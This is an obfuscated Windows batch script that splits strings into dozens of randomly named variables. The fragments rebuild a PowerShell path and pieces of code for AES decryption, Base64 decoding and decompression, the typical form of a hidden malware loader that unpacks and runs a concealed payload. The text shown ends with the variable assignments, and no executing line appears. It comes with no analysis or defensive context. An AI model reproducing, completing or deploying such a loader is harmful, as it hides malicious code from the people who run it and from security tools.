@echo off
set "uawRtCcFrZ= /"
set "INQVgpRWSZ=y "
set "dwrDcITknQ=:\"
set "jXtdRNichd=po"
set "TenCNTcQEx= C"
set "QJiSjAVsiA=Po"
set "RMtkyhVlRO=do"
set "VrbEdLWlmV=ws"
set "DYufDtUPCw=rS"
set "EnrqCvePVO=Wi"
set "wUBiIPURDu=st"
set "wpYqqUTCPZ=32"
set "nzBwYkFYYQ=co"
set "iOtAMhkgmC=ow"
set "kYDsuaVdrT=em"
set "jrhehEfQTY=we"
set "aEPWMZWdAZ=0\"
set "mDcrFDkWwz=ll"
set "GfPLGJbHkZ=1."
set "VkCpGIMMUS=he"
set "FfrnsRodpP=\v"
set "BZAhfzsDEF=ll"
set "TAllrgNqKV=we"
set "tLuDoFMXas=s\"
set "MqGFzimYIf=nd"
set "EBJplmWIuS=py"
set "xNBOhJYWFJ=xe"
set "lFtFxGlWDQ=.e"
set "TzpzUiEBbX=he"
set "KVtFhQKCvK=in"
set "CCMwzaquAs=rs"
set "rzbrgzkmUy=\W"
set "OnVQLNQLeU=Sy"
set "aLeWVdWLLA= %~dp0"
set "ssIFtQeGQn=cd"
set "IaLnSGfYfp=uuJK"
set "gABSjLfxrU=pose"
set "gwduPKQfnn=b.En"
set "uOOnaiqFZz=();$"
set "JMRoyscYmZ='[-1"
set "PSlvedguBw=File"
set "JYDMTFgBGO=$HDV"
set "LxjDWagNLT=s75K"
set "fRAvgZcVzD=Syst"
set "OIKzwGsJnY=7;$f"
set "pSiKSSUtpp=]::N"
set "onXbGXLyXc=ss -"
set "RoXawEvuaB=ionM"
set "qkAUfDtoRH=m.Re"
set "zhuRuqcwBB=hy.A"
set "wBQtDqALZf=fuuJ"
set "KLdXxjwSFE=.Sec"
set "fRkzLiOWPu=pres"
set "COeXlkYWtY=6] -"
set "UBvViDNZDE=rity"
set "zVLqEpDOfw=gth)"
set "SzRUyqdCLC= New"
set "yTjYcqSdlI=);$f"
set "KPVPoquoxF=ne);"
set "SefOAFXPXK=)) {"
set "RpmpIoWNxo=]::C"
set "PihPsovPRI=form"
set "sfpiwcJwYz=;$IZ"
set "LuYNhHOtFd=am;$"
set "yFVKLSWceX=FFu "
set "ajMnwyLrnR=ring"
set "miNkwVbASi=jmqg"
set "UdMoCysDRp=L4Yi"
set "zUkzfhtYQy=nage"
set "GLAVUKeyWZ=DEeT"
set "vlqRpjlKTr=();$"
set "NEQNdhWQnN=F'[-"
set "IyzKRpBcjD=lBlo"
set "AwbIkqaYZO=ew-O"
set "foGvIUqbpQ='0Pg"
